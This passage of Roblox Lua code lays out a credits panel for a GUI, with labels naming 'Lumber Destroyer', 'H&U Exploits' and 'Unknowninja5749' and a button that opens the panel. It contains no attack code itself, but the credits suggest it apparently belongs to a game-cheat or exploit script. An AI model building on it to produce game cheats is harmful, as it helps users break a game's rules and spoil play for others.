andd.Font = Enum.Font.GothamBold
andd.Text = "and"
andd.TextColor3 = Color3.fromRGB(255, 255, 255)
andd.TextSize = 25.000

lumber.Name = "lumber"
lumber.Parent = creditsbframe
lumber.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
lumber.BorderSizePixel = 0
lumber.Position = UDim2.new(0.0112359552, 0, 0.843049347, 0)
lumber.Size = UDim2.new(0, 176, 0, 35)
lumber.Font = Enum.Font.GothamBold
lumber.Text = "Lumber Destroyer"
lumber.TextColor3 = Color3.fromRGB(255, 255, 255)
lumber.TextSize = 20.000

hu.Name = "h&u"
hu.Parent = creditsbframe
hu.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
hu.BorderSizePixel = 0
hu.Position = UDim2.new(0.0112359542, 0, 0.69733727, 0)
hu.Size = UDim2.new(0, 176, 0, 35)
hu.Font = Enum.Font.GothamBold
hu.Text = "H&U Exploits"
hu.TextColor3 = Color3.fromRGB(29, 0, 244)
hu.TextSize = 25.000

unknown.Name = "unknown"
unknown.Parent = creditsbframe
unknown.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
unknown.BorderSizePixel = 0
unknown.Position = UDim2.new(0.0112359552, 0, 0.431498051, 0)
unknown.Size = UDim2.new(0, 176, 0, 35)
unknown.Font = Enum.Font.GothamBold
unknown.Text = "Unknowninja5749"
unknown.TextColor3 = Color3.fromRGB(255, 255, 255)
unknown.TextSize = 20.000

openc.Name = "openc"
openc.Parent = creditsframe
openc.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
openc.BorderSizePixel = 0
openc.Position = UDim2.new(0.79651165, 0, 0, 0)
openc.Size = UDim2.new(0.200000003, 0, 0, 30)
openc.Font = Enum.Font.GothamBold
openc.Text = "+"
openc.TextColor3 = Color3.fromRGB(255, 255, 255)
openc.TextSize = 20.000
openc.MouseButton1Down:connect(function()
      creditsbframe.Visible = true
      openc.Visible = true
end)